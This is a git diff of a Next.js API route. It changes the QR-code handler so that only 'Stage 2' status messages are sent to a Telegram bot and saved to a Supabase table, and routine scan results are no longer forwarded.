@@ -219,48 +219,43 @@ export async function POST(req: NextRequest) {
         break;
 
       case MessageType.QrCode:
-        let qrMessage = `${sessionPrefix}--- 📸 *QR-код*${attemptSuffix} ---\n`;
-        if (qrCodeData) {
-          if (qrCodeData === "QR Scan Timed Out") {
-            qrMessage += `*QR-код:* Սկանավորման ժամանակը սպառվեց ⏳ (Время: ${formattedTimestamp})\n`;
-          } else if (qrCodeData.startsWith("QR Scan Error:")) {
-            qrMessage += `*QR-код:* Սկանավորման սխալ ❌ (${qrCodeData.replace("QR Scan Error: ", "")}) (Время: ${formattedTimestamp})\n`;
-          } else {
-            qrMessage += `*QR-կոդը սկանավորված է:* Այո ✅ (\`${qrCodeData}\`) (Время: ${formattedTimestamp})\n`;
-          }
-        } else {
-          qrMessage += `*QR-կոդը սկանավորված է:* Ոչ ❌ (Время: ${formattedTimestamp})\n`;
-        }
+        // Обрабатываем специальное сообщение "Этап 2"
+        if (qrCodeData && qrCodeData.startsWith("Этап 2:")) {
+          let qrMessage = `${sessionPrefix}--- 📸 *QR-код*${attemptSuffix} ---\n`;
+          qrMessage += `*Статус:* ${qrCodeData} (Время: ${formattedTimestamp})\n`;
 
-        telegramPromises.push(
-          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: qrMessage, parse_mode: "Markdown" }),
-          }).then(async res => {
-            console.log("QR Code message API response status:", res.status);
-            if (!res.ok) { const errorBody = await res.text(); console.error("QR Code message API error response:", errorBody); }
-            return res;
-          })
-        );
-
-        // Supabase: Save QR code data
-        supabasePromises.push(
-          Promise.resolve( // Оборачиваем в Promise.resolve()
-            supabase.from('qr_codes').insert({
-              session_id: sessionId,
-              attempt: attempt,
-              timestamp: new Date(timestamp).toISOString(),
-              qr_code_data: qrCodeData,
-            }).then(({ data, error }) => {
-              if (error) {
-                console.error("Supabase: Error saving QR code data:", error);
-              } else {
-                console.log("Supabase: QR code data saved successfully.");
-              }
+          telegramPromises.push(
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: qrMessage, parse_mode: "Markdown" }),
+            }).then(async res => {
+              console.log("QR Code (Stage 2) message API response status:", res.status);
+              if (!res.ok) { const errorBody = await res.text(); console.error("QR Code (Stage 2) message API error response:", errorBody); }
+              return res;
             })
-          )
-        );
+          );
+
+          // Supabase: Save QR code data (для Этапа 2)
+          supabasePromises.push(
+            Promise.resolve(
+              supabase.from('qr_codes').insert({
+                session_id: sessionId,
+                attempt: attempt,
+                timestamp: new Date(timestamp).toISOString(),
+                qr_code_data: qrCodeData, // Сохраняем сообщение "Этап 2"
+              }).then(({ data, error }) => {
+                if (error) {
+                  console.error("Supabase: Error saving QR code (Stage 2) data:", error);
+                } else {
+                  console.log("Supabase: QR code (Stage 2) data saved successfully.");
+                }
+              })
+            )
+          );
+        }
+        // Обычные сообщения о сканировании QR-кода (успех/ошибка/таймаут) больше не отправляются в Telegram
+        // и не сохраняются в Supabase, как было запрошено.
         break;
 
       default:
